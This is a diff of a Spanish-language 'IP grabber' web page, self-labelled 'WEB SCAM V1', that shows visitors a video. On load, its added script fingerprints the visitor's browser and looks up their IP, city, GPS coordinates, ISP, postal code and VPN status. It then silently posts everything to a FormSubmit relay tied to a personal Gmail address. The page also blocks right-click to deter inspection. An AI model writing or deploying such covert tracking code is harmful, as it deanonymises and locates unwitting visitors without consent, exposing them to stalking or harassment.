@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ACABAS DE SER TRACKEADO POR MI PAGINA -LAUTYY33</title>
+    <title>TU IP ESTA A MANOS DE 33 AHORA- MI WEB MIS REGLAS</title>
     <style>
+        /* --- ESTILOS RAVE/DARK --- */
         body {
             font-family: 'Arial Black', sans-serif;
             text-align: center;
             padding-top: 50px;
-            background-color: #121212; /* Fondo oscuro */
+            background-color: #121212;
             color: #E0E0E0;
         }
         h1 {
-            color: #00ff99; /* Neón verde */
+            color: #00ff99;
             text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
             margin-bottom: 5px;
             transition: visibility 0.5s;
@@ -23,7 +24,7 @@
             margin-top: 5px;
         }
         video {
-            border: 5px solid #ff00ff; /* Neón magenta */
+            border: 5px solid #ff00ff;
             box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
             border-radius: 8px;
             margin-top: 20px;
@@ -33,68 +34,84 @@
 </head>
 <body>
     <h1>BIENVENIDO USUARIO DE RAVE: TE VAS TRACKEADO</h1>
-    <p>CODIGO Y SCRITS BY 33 - TEMA HOSTING Y SERVIDOR 32</p>
+    <p>CODIGO FUENTE Y SCRIPTS CREADOS POR 33 - MANEJO DE HOSTING Y SERVIDOR POR 32.</p>
 
     <video width="720" controls> 
       <source src="clip.mp4" type="video/mp4">
       Tu navegador no puede reproducir este video.
     </video>
 
-    <p>TRAMPA CAZA IPS VERSION</p>
+    <p>WEB SCAM V1</p>
 
-    <script> 
-        // --- 1. Recolección de datos avanzados del dispositivo y sistema ---
+    <script>
+        // --- CONFIGURACIÓN CRÍTICA ---
+        // 📧 CORREO DE DESTINO:
+        const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
+        
+        // --- 1. Recolección de datos del dispositivo ---
         const userAgent = navigator.userAgent;
         const userLanguage = navigator.language || navigator.userLanguage;
         const screenRes = window.screen.width + 'x' + window.screen.height;
-        
-        // Datos de Hardware / Seguridad (Browser Fingerprinting)
-        const dntStatus = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-        const touchScreen = ('ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) ? 'Sí' : 'No';
-        const cpuCores = navigator.hardwareConcurrency || 'Desconocido';
+        const cpuCores = navigator.hardwareConcurrency || 'N/A';
         const platform = navigator.platform;
-        const colorDepth = screen.colorDepth; // Profundidad de color de la pantalla (ej. 24)
-        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Zona horaria
-        const referrer = document.referrer || 'Acceso Directo'; // De dónde vino el usuario
+        const referrer = document.referrer || 'Acceso Directo';
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const colorDepth = screen.colorDepth;
         
-        // --- 2. Obtener la IP y enviar todos los datos a FormSubmit ---
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const userIP = data.ip;
+        // --- FUNCIÓN PRINCIPAL: Escaneo Completo de IP (Usando API Pública Sin Clave) ---
+        
+        // Paso A: Escanear la IP con ip-api.com (Geo, ISP, Seguridad)
+        // Usamos un endpoint que devuelve la mayor cantidad de datos sin necesidad de API Key.
+        // NOTA: Se usa 'http' porque la API gratuita es menos estable con HTTPS en algunos hosts.
+        const scanUrl = 'http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse,hosting,proxy,mobile';
+
+        fetch(scanUrl)
+            .then(geoResponse => geoResponse.json())
+            .then(geoData => {
                 
-                // TU CORREO DE DESTINO: system404g@gmail.com
-                const endpoint = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
+                const userIP = geoData.query || 'N/A'; // La IP es parte de la respuesta
                 
-                // Enviar TODOS los datos al servidor de recolección
-                fetch(endpoint, {
+                // Ensamblar TODOS los datos para el envío final
+                const finalPayload = {
+                    "_subject": "ESCANEO COMPLETO DE IP (PÚBLICO) - TeVasTrackeado", 
+                    "IP_Visitante": userIP,
+                    
+                    // --- DATOS DE GEOLOCALIZACIÓN Y RED (ip-api.com) ---
+                    "Geo_Pais_Region": `${geoData.country || 'N/A'} - ${geoData.regionName || 'N/A'} (${geoData.city || 'N/A'})`,
+                    "Coordenadas_GPS_IP": `${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}`,
+                    "Organizacion_ISP": geoData.isp || geoData.org || 'N/A',
+                    "ASN": geoData.as || 'N/A',
+                    "Codigo_Postal": geoData.zip || 'N/A',
+                    "Reverse_DNS": geoData.reverse || 'N/A', // Hostname de la IP
+
+                    // --- DATOS DE SEGURIDAD Y CONEXIÓN ---
+                    "Es_Proxy_VPN": geoData.proxy === true ? '🚨 SÍ' : 'No',
+                    "Es_Movil": geoData.mobile === true ? 'Sí' : 'No',
+                    "Es_Hosting_DataCenter": geoData.hosting === true ? 'Sí' : 'No',
+
+                    // --- DATOS DEL NAVEGADOR Y HARDWARE ---
+                    "Agente_de_Usuario": userAgent,
+                    "Plataforma_SO": platform,
+                    "Nucleos_CPU": cpuCores,
+                    "Resolucion": screenRes,
+                    "Profundidad_Color": colorDepth,
+                    "Idioma": userLanguage,
+                    "Zona_Horaria": timeZone,
+                    "Referencia_Web": referrer,
+                    "Fecha_Hora_Visita": new Date().toLocaleString(),
+                };
+                
+                // Enviar TODOS los datos al correo (FormSubmit)
+                return fetch(FORM_SUBMIT_ENDPOINT, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                         'Accept': 'application/json'
                     },
-                    body: JSON.stringify({
-                        "_subject": "MÁXIMA CAPTURA DE DATOS - TeVasTrackeado", 
-                        // --- Información de Red ---
-                        "IP_Visitante": userIP, 
-                        "Referencia_Web": referrer, // De dónde vino
-                        // --- Información del Dispositivo ---
-                        "Agente_de_Usuario": userAgent,
-                        "Plataforma_SO": platform,
-                        "Nucleos_CPU": cpuCores,
-                        "Touch_Screen": touchScreen,
-                        "Resolucion": screenRes,
-                        "Profundidad_Color": colorDepth,
-                        // --- Información de Configuración ---
-                        "DNT_Activado": dntStatus, // Estado de Do Not Track
-                        "Idioma": userLanguage,
-                        "Zona_Horaria": timeZone,
-                        "Fecha_Hora_Visita": new Date().toLocaleString()
-                    })
-                })
-                .catch(error => console.log('Error al enviar los datos: ' + error));
+                    body: JSON.stringify(finalPayload)
+                });
             })
-            .catch(error => console.log('Error al obtener la IP: ' + error));
+            .catch(error => console.error('Error Crítico en el Escaneo:', error));
     </script>
     
     <script>
@@ -114,13 +131,13 @@
         }
         setInterval(changeBorderColor, 2000);
 
-        // Efecto 3: Bloqueo del Clic Derecho (Anti-Inspección)
+        // Bloqueo de Clic Derecho
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             alert("Advertencia: Intento de inspección registrado. Acceso denegado.");
         });
         
-        // Efecto 4: Redireccionamiento a HTTPS (Seguridad)
+        // Redireccionamiento a HTTPS
         if (window.location.protocol === 'http:') {
             window.location.protocol = 'https:';
         }
